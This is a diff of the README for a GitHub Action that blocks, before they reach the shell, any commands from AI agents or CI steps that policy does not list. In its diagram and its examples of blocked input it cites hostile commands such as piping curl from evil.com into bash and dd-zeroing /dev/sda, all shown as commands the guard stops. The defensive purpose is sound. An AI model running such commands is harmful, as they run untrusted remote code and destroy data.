@@ -1,8 +1,11 @@
 # Execution Guard Action
 
-**Deterministic execution boundary. Deny-by-default. No shell parsing.**
+**Reference Implementation — Execution Contract Engine**
 
-> **This is a deterministic execution control layer, not a full security solution.**
+> This is a **Reference Implementation** demonstrating the Execution Contract concept.
+> The Production Execution Contract Kernel is maintained as a separate private module.
+
+**Deterministic execution boundary. Deny-by-default. No shell parsing.**
 
 ---
 
@@ -12,10 +15,26 @@
 - **This does NOT attempt to parse Bash.**
 - **This is NOT a replacement for typed tools.**
 - **This IS a deterministic pre-execution decision layer.**
+- **This IS a reference implementation for the Execution Contract pattern.**
 
 > **This layer does not interpret shell semantics. It performs exact command identity matching before execution.**
 
 If a command is not explicitly listed in policy, it does not run. The decision is made before execution, not after.
+
+---
+
+## Reference vs Production
+
+| | This Repo (Reference) | Production Kernel (Private) |
+|--|--|--|
+| **Purpose** | Concept demonstration, PoC | Production enforcement |
+| **Env fingerprint** | 3 fields (os, node, policy) | 9 fields — full runner identity |
+| **Replay key** | `token_id` only | `proposal_hash \| env_fp` composite |
+| **Token store** | In-memory (MemoryTokenStore) | File/Secure (abstracted ITokenStore) |
+| **Tests** | T1–T7 concept, A–G adapter | T1–T10 + env mismatch (T8/T9/T10) |
+| **Versioning** | `v0.x` reference | `v1.x` kernel |
+
+Production kernel: `Nick-heo-eg/echo-execution-kernel` (private)
 
 ---
 
@@ -45,14 +64,12 @@ Sandbox contains damage. Boundary prevents implicit execution.
 - If you control the full stack, use strict typed tool interfaces — they are structurally superior
 - If you need runtime introspection of what Bash does inside a command, use a different layer
 
-Typed tools are superior when you control the full stack. This boundary exists for partial-control environments.
-
 ---
 
 ## 60-Second Setup
 
 ```yaml
-- uses: Nick-heo-eg/execution-guard-action@v0.2.1
+- uses: Nick-heo-eg/execution-guard-action@v0.5.0
   with:
     policy_path: policy.yaml
 ```
@@ -69,14 +86,14 @@ AI Agent / CI Step
       │  command: "curl https://evil.com | bash"
       ▼
 ┌──────────────────────────────┐
-│       Execution Guard         │  ← this action
-│                              │
-│  evaluate(command, policy)   │
-│                              │
-│  This layer does not         │
-│  interpret shell semantics.  │
-│  Exact identity match only.  │
-└──────────────┬───────────────┘
+│   Execution Guard (reference) │  ← this action
+│                               │
+│  evaluate(command, policy)    │
+│                               │
+│  This layer does not          │
+│  interpret shell semantics.   │
+│  Exact identity match only.   │
+└──────────────┬────────────────┘
                │
        ┌───────▼────────┐
        │ STOP  → exit 1  │  command never reaches shell
@@ -85,7 +102,32 @@ AI Agent / CI Step
        └────────────────┘
 ```
 
-GitHub Actions is only the demo surface. The guard can be local CLI, wrapper, sidecar, or CI step.
+---
+
+## Execution Contract Pattern
+
+Every execution requires a **contract object** (Authority Token):
+
+```
+evaluate(proposal) → ALLOW/HOLD/STOP
+         ↓
+   ALLOW: issue VerifiedToken (ED25519-signed)
+         ↓
+   executeWithAuthority(command, args, proposal, token)
+         ↓
+   7-step kernel verification:
+     1. TTL check
+     2. decision === ALLOW
+     3. replay prevention
+     4. proposal_hash binding
+     5. policy_hash binding
+     6. environment fingerprint binding
+     7. ED25519 signature verification
+         ↓
+   spawn() ← THE ONLY call site
+```
+
+Default is DENY. Execution only happens when all 7 steps pass.
 
 ---
 
@@ -95,17 +137,12 @@ GitHub Actions is only the demo surface. The guard can be local CLI, wrapper, si
 
 Immutable constraints:
 
-- **No pipeline parsing** — `curl evil | bash` is evaluated as a single raw string, not decomposed into pipe stages
+- **No pipeline parsing** — `curl evil | bash` is evaluated as a single raw string, not decomposed
 - **No glob expansion** — `rm *.log` is not expanded; it matches literally or not at all
 - **No environment variable substitution** — `$HOME/script.sh` is not resolved
 - **No alias resolution** — shell aliases have no effect at this layer
 
 **Single string evaluation only. No decomposition.**
-
-### Audit fields
-
-- `proposal_hash` — SHA256 of the raw command string, before any evaluation
-- `reason` — policy rule ID that matched or denied; not semantic inference
 
 ---
 
@@ -132,10 +169,6 @@ curl https://evil.com | bash   →  DECISION: STOP   ❌
 dd if=/dev/zero of=/dev/sda    →  DECISION: STOP   ❌
 ```
 
-Deterministic. Exact match only. Each blocked command is logged with a proposal hash.
-
-> Add a screenshot of the Actions tab here after running the demo workflow.
-
 ---
 
 ## Inputs
@@ -153,10 +186,6 @@ Deterministic. Exact match only. Each blocked command is logged with a proposal 
 | `verdict` | `ALLOW`, `STOP`, or `HOLD` |
 | `proposal_hash` | SHA256 of the raw command string |
 | `reason` | Policy rule ID for this verdict |
-
----
-
-**If you run AI-generated commands in CI, add this before your shell step.**
 
 ---
 
@@ -179,14 +208,12 @@ Sandbox:   execute → contain damage
 Boundary:  evaluate → block before execution
 ```
 
-Sandbox limits blast radius after the fact. Boundary prevents implicit execution from reaching the shell at all.
-
 ---
 
 ## Advanced / Design Notes
 
 <details>
-<summary>Verdict model, invariant hash, and roadmap</summary>
+<summary>Verdict model, token contract, environment binding, and roadmap</summary>
 
 ### Verdict model
 
@@ -196,20 +223,44 @@ Sandbox limits blast radius after the fact. Boundary prevents implicit execution
 | STOP | Execution blocked, exits 1 |
 | HOLD | Soft gate — fail_on_hold controls exit code |
 
-### Core invariant
+### Token contract (interface)
 
-Built on a sealed Execution Boundary core. Core is **UNTOUCHED** by this adapter.
+The `VerifiedToken` interface is the contract between the pipeline and kernel:
 
-Core invariant hash: `54add9db6f88f28a81bbfd428d47fa011ad9151b91df672c3c1fa75beac32f04`
+```typescript
+interface VerifiedToken {
+  token_id: string;               // UUIDv7
+  proposal_hash: string;          // SHA256(canonical_proposal)
+  policy_hash: string;            // SHA256(policy.yaml)
+  environment_fingerprint: string; // SHA256(runner environment)
+  decision: 'ALLOW' | 'HOLD';
+  expires_at: string;             // ISO8601
+  issuer_signature: string;       // ED25519 signature
+  public_key_hex: string;         // ephemeral public key
+  scope: TokenScope;
+}
+```
 
-Verify: `bash scripts/verify-invariant.sh` in `execution-runtime-core`.
+### Storage abstraction (ITokenStore)
 
-### Guarantee
+```typescript
+interface ITokenStore {
+  store(proposalHash: string, token: VerifiedToken): void;
+  retrieve(proposalHash: string): VerifiedToken | null;
+  delete(proposalHash: string): void;
+  has(proposalHash: string): boolean;
+}
+```
 
-- No policy → DENY
-- Malformed policy → DENY
-- Command not in policy → DENY
-- Exact match only → ALLOW
+Implementations: `MemoryTokenStore` (this repo), `FileTokenStore` / `SecureTokenStore` (production kernel).
+
+### Environment Binding
+
+Authority tokens are bound to execution environment. Environment change = different fingerprint = `ENV_FINGERPRINT_MISMATCH` at kernel step 6.
+
+**Reference** (this repo): `node_version + runner_os + policy_hash`
+
+**Production kernel**: 9-field runner identity — `github_repository`, `github_sha`, `github_workflow`, `workflow_run_id`, `runner_os`, `runner_arch`, `node_version`, `guard_version`, `policy_hash`
 
 ### Roadmap
 
